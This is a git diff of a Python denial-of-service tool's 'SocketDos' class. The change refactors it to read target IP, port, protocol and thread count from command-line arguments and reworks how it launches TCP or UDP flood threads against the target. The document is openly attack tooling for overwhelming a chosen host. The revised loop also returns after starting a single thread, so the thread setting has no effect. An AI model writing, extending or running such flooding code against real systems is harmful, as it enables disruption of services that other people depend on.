@@ -5,18 +5,25 @@ import itertools
 import time
 from threading import Thread
 from src.utils import color_text
-from src.config import TCP, UDP
+from src.config import TCP, UDP, DEFAULT_NUM_THREADS
+
 
 class SocketDos():
 
-    def __init__(self, target_ip, target_port, protocol, tcp_size_bytes=1024, udp_size_bytes=1024, thread_number=4):
-        self.target_ip = target_ip
-        self.target_port = target_port
-        self.protocol = protocol
-        self.tcp_size_bytes = tcp_size_bytes
-        self.udp_size_bytes = udp_size_bytes
-        self.thread_number = thread_number
+    def __init__(self, args):
+        self.target_ip = args.target
+        self.target_port = args.port
+        self.protocol = self.get_socket_type(args.attack)
+        self.tcp_size_bytes = getattr(args, 'tcp_size_bytes', 1024)
+        self.udp_size_bytes = getattr(args, 'udp_size_bytes', 1024)
+        self.threads = args.threads if args.threads is not None else DEFAULT_NUM_THREADS
+        self.monothread = args.monothread if args.monothread is not None else False
         self.counter = itertools.count(1)
+
+    def get_socket_type(self, protocol):
+        if protocol == 'tcp':
+            return TCP
+        return UDP
 
     def tcp_flood(self):
         try:
@@ -41,7 +48,7 @@ class SocketDos():
     def count_requests(self):
 
         request_nb = next(self.counter)
-        
+
         if request_nb % 10_000 == 0:
             sys.stdout.write(f'{request_nb} request send !\r\n')
             sys.stdout.flush()
@@ -50,15 +57,22 @@ class SocketDos():
         """
         Manage threads and choose attack method
         """
-        threads = []
         try:
-            for _ in range(self.thread_number):
+            for _ in range(self.threads):
                 if self.protocol != False:
                     if self.protocol == UDP:
-                        thread = Thread(target=self.udp_flood).start()
+                        if self.monothread:
+                            return self.udp_flood()
+
+                        thread = Thread(target=self.udp_flood)
+                        return thread.start()
+
                     if self.protocol == TCP:
-                        thread = Thread(target=self.tcp_flood).start()
-                    # thread.start()
+                        if self.monothread:
+                            return self.tcp_flood()
+
+                        thread = Thread(target=self.tcp_flood)
+                        return thread.start()
                 else:
                     print('Bad method')
                     return
